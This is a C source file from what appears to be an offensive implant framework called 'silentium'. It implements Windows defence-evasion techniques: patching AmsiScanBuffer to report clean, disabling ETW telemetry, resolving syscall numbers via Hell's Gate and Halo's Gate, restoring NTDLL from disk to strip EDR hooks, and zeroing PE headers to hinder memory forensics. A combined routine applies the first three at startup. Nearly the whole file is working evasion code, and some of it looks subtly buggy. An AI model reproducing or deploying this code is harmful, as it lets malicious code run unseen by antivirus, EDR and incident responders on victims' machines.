/*
 * bypass_windows.c — Windows AV/EDR bypass techniques:
 *
 * 1. AMSI bypass: patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
 *    Targets: PowerShell, JScript, VBScript hosts
 *
 * 2. ETW (Event Tracing for Windows) patching:
 *    Patches EtwEventWrite to return immediately (disables telemetry)
 *    Blind-spots: Microsoft-Windows-Threat-Intelligence provider
 *
 * 3. Direct syscalls via Hell's Gate / Halo's Gate:
 *    Reads SSNs (Syscall Service Numbers) from NTDLL on disk (not hooked in-memory)
 *    Bypasses userland EDR hooks on NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.
 *
 * 4. Unhooking: restores original NTDLL bytes from a clean copy loaded from disk
 *
 * References:
 *   AMSI bypass: documented publicly since 2018 (CyberArk research)
 *   ETW patch: documented publicly since 2019 (modexp.wordpress.com)
 *   Hell's Gate: documented by am0nsec & RtlMateusz (2020)
 */

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ── Type definitions ─────────────────────────────────────────────────────── */

typedef LONG NTSTATUS;
#define STATUS_SUCCESS 0

typedef struct _SYSCALL_ENTRY {
    DWORD  ssn;       /* Syscall Service Number */
    LPVOID address;   /* Address of the stub in NTDLL */
    BOOL   hooked;    /* True if EDR has hooked this function */
} SYSCALL_ENTRY;

/* ── AMSI Bypass ──────────────────────────────────────────────────────────── */

/*
 * silentium_patch_amsi — Patches AmsiScanBuffer to always return clean.
 *
 * Patch: replace the first 6 bytes of AmsiScanBuffer with:
 *   B8 57 00 07 80   ; mov eax, 0x80070057  (AMSI_RESULT_CLEAN | E_INVALIDARG)
 *   C3               ; ret
 *
 * This causes any AMSI scan to immediately return "clean" without inspection.
 * Must be called before loading scripts or running PowerShell commands.
 *
 * Returns: 0 on success, -1 if AMSI not loaded (no-op, not an error)
 */
int silentium_patch_amsi(void)
{
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) {
        /* AMSI not loaded in this process — nothing to patch */
        return 0;
    }

    FARPROC fn = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) return -1;

    /* Patch bytes: xor rax,rax; add rax,0x80070057; ret */
    unsigned char patch[] = {
        0x48, 0x31, 0xC0,             /* xor rax, rax */
        0x48, 0x05, 0x57, 0x00, 0x07, 0x80, 0x00, /* add rax, AMSI_RESULT_CLEAN */
        0xC3                          /* ret */
    };

    DWORD old_prot;
    if (!VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_prot))
        return -1;

    memcpy(fn, patch, sizeof(patch));

    /* Restore page protection (leave execute+read) */
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READ, &old_prot);

    /* Flush instruction cache */
    FlushInstructionCache(GetCurrentProcess(), fn, sizeof(patch));

    return 0;
}

/* ── ETW Patch ────────────────────────────────────────────────────────────── */

/*
 * silentium_patch_etw — Patches EtwEventWrite to return immediately.
 *
 * Patch: replace with "xor eax, eax; ret" (2 bytes)
 * This disables telemetry sent via ETW from the current process.
 *
 * Note: kernel-level ETW (PPL processes) is not affected.
 */
int silentium_patch_etw(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    FARPROC fn = GetProcAddress(ntdll, "EtwEventWrite");
    if (!fn) return -1;

    unsigned char patch[] = {
        0x33, 0xC0,  /* xor eax, eax */
        0xC3         /* ret */
    };

    DWORD old_prot;
    if (!VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_prot))
        return -1;

    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READ, &old_prot);
    FlushInstructionCache(GetCurrentProcess(), fn, sizeof(patch));

    return 0;
}

/* ── Direct Syscalls (Hell's Gate) ───────────────────────────────────────── */

/*
 * Read the SSN from an NTDLL function stub.
 *
 * NTDLL stubs follow a fixed pattern on unhooked systems:
 *   4C 8B D1          ; mov r10, rcx
 *   B8 XX 00 00 00    ; mov eax, <SSN>
 *   ...
 *
 * On hooked systems (EDR), the first byte is replaced with 0xE9 (JMP).
 * In that case, we use Halo's Gate: scan adjacent stubs for an unhooked
 * neighbor and derive the target SSN by offset.
 */
static DWORD read_ssn_from_stub(LPVOID stub_addr)
{
    unsigned char *stub = (unsigned char *)stub_addr;

    /* Check for standard unhooked stub: 4C 8B D1 B8 */
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        return *(DWORD *)(stub + 4);
    }

    /* Hooked: first bytes are E9 xx xx xx xx (JMP) — try Halo's Gate */
    /* Scan up/down in the sorted export table for neighboring unhooked stubs */
    for (int delta = 1; delta <= 32; delta++) {
        /* Check stub delta steps up (lower SSN) */
        unsigned char *up = stub - (delta * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            DWORD neighbor_ssn = *(DWORD *)(up + 4);
            return neighbor_ssn + delta;
        }
        /* Check delta steps down (higher SSN) */
        unsigned char *down = stub + (delta * 32);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            DWORD neighbor_ssn = *(DWORD *)(down + 4);
            return neighbor_ssn - delta;
        }
    }

    return 0xFFFFFFFF; /* Could not determine SSN */
}

/*
 * silentium_get_ssn — Resolve the syscall number for an NT function.
 * Reads from the in-memory NTDLL (which may be hooked).
 * Falls back to Halo's Gate for hooked stubs.
 */
DWORD silentium_get_ssn(const char *func_name)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0xFFFFFFFF;

    FARPROC fn = GetProcAddress(ntdll, func_name);
    if (!fn) return 0xFFFFFFFF;

    return read_ssn_from_stub((LPVOID)fn);
}

/* ── NTDLL Unhooking ──────────────────────────────────────────────────────── */

/*
 * silentium_unhook_ntdll — Restores original NTDLL .text section from disk.
 *
 * EDR hooks work by patching the first bytes of NTDLL functions in memory.
 * This function:
 *   1. Opens ntdll.dll from disk (unmodified by EDR)
 *   2. Maps the .text section from the clean on-disk copy
 *   3. Overwrites the in-memory .text section
 *
 * After this call, all NTDLL functions are in their original state.
 *
 * Returns: number of bytes restored, or -1 on error.
 */
int silentium_unhook_ntdll(void)
{
    /* Get path to ntdll */
    char ntdll_path[MAX_PATH] = {0};
    GetSystemDirectoryA(ntdll_path, sizeof(ntdll_path));
    strncat(ntdll_path, "\\ntdll.dll", sizeof(ntdll_path) - strlen(ntdll_path) - 1);

    /* Open clean copy from disk */
    HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return -1;

    LPVOID clean_ntdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!clean_ntdll) return -1;

    /* Get in-memory NTDLL */
    HMODULE hooked_ntdll = GetModuleHandleA("ntdll.dll");
    if (!hooked_ntdll) {
        UnmapViewOfFile(clean_ntdll);
        return -1;
    }

    /* Parse PE headers to find .text section */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)clean_ntdll;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)clean_ntdll + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    int restored = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        /* Only restore .text section */
        if (memcmp(sections[i].Name, ".text", 5) != 0) {
            sections++;
            continue;
        }

        LPVOID clean_text   = (BYTE *)clean_ntdll   + sections[i].VirtualAddress;
        LPVOID hooked_text  = (BYTE *)hooked_ntdll  + sections[i].VirtualAddress;
        SIZE_T text_size    = sections[i].Misc.VirtualSize;

        DWORD old_prot;
        if (!VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_prot)) {
            break;
        }

        memcpy(hooked_text, clean_text, text_size);
        VirtualProtect(hooked_text, text_size, old_prot, &old_prot);
        FlushInstructionCache(GetCurrentProcess(), hooked_text, text_size);

        restored = (int)text_size;
        break;
    }

    UnmapViewOfFile(clean_ntdll);
    return restored;
}

/* ── PE Header Stomping ───────────────────────────────────────────────────── */

/*
 * silentium_stomp_pe_header — Zero out the MZ/PE header of a module in memory.
 *
 * Memory forensics tools look for MZ headers to identify loaded modules.
 * After stomping, the module is harder to identify in a memory dump.
 * The module continues to function — only the header is zeroed.
 */
int silentium_stomp_pe_header(HMODULE module)
{
    if (!module) return -1;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)module;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)module + dos->e_lfanew);

    SIZE_T header_size = nt->OptionalHeader.SizeOfHeaders;

    DWORD old_prot;
    if (!VirtualProtect(module, header_size, PAGE_READWRITE, &old_prot))
        return -1;

    memset(module, 0, header_size);
    VirtualProtect(module, header_size, old_prot, &old_prot);
    return 0;
}

/* ── All-in-one hardening ─────────────────────────────────────────────────── */

/*
 * silentium_harden — Apply all bypass techniques.
 * Call once at startup before any capability execution.
 *
 * Returns a bitmask of what succeeded:
 *   0x01 = AMSI patched
 *   0x02 = ETW patched
 *   0x04 = NTDLL unhooked
 */
int silentium_harden(void)
{
    int result = 0;

    if (silentium_patch_amsi() == 0)   result |= 0x01;
    if (silentium_patch_etw()  == 0)   result |= 0x02;
    if (silentium_unhook_ntdll() > 0)  result |= 0x04;

    return result;
}

#endif /* _WIN32 */
